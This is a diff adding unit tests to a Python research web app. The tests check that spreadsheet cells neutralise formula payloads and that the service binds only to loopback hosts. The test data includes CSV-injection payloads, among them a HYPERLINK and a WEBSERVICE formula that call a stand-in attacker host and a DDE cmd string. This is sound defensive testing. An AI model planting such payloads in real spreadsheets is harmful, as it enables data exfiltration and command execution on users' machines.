@@ -62,9 +62,11 @@ from auto_research.evidence.webapp import (
     is_read_only_mutation,
     make_xlsx,
     parse_search_paper_ids,
+    require_loopback_host,
     requires_rescan_confirmation,
     search_export_rows,
     search_paper_catalog,
+    spreadsheet_safe_cell,
 )
 from auto_research.evidence.workflow import run_article_workflow
 from auto_research.evidence.six_column import (
@@ -1516,6 +1518,25 @@ class SixColumnWorkflowTests(unittest.TestCase):
         data = make_xlsx(rows, ["value_text", "meaning", "unit", "article_title", "doi"])
         self.assertTrue(data.startswith(b"PK"))
         self.assertIn(b"xl/worksheets/sheet1.xml", data)
+
+    def test_csv_formula_payloads_are_neutralized(self):
+        for value in (
+            '=HYPERLINK("https://attacker.invalid/?leak=data")',
+            "+cmd|' /C calc'!A0",
+            "-2+3",
+            "@SUM(1,1)",
+            "\t=WEBSERVICE(\"https://attacker.invalid\")",
+        ):
+            safe = spreadsheet_safe_cell(value)
+            self.assertEqual(safe, "'" + value)
+        self.assertEqual(spreadsheet_safe_cell("ΔH_mix = -7.27"), "ΔH_mix = -7.27")
+        self.assertEqual(spreadsheet_safe_cell("42"), "42")
+
+    def test_service_binding_rejects_non_loopback_hosts(self):
+        self.assertEqual(require_loopback_host("LOCALHOST"), "localhost")
+        for host in ("0.0.0.0", "192.168.1.10", "example.invalid", ""):
+            with self.assertRaisesRegex(ValueError, "local-only"):
+                require_loopback_host(host)
 
     def test_qualitative_export_keeps_source_and_cluster_provenance(self):
         finding = search_qualitative_findings(self.db, "空洞", limit=1)[0]
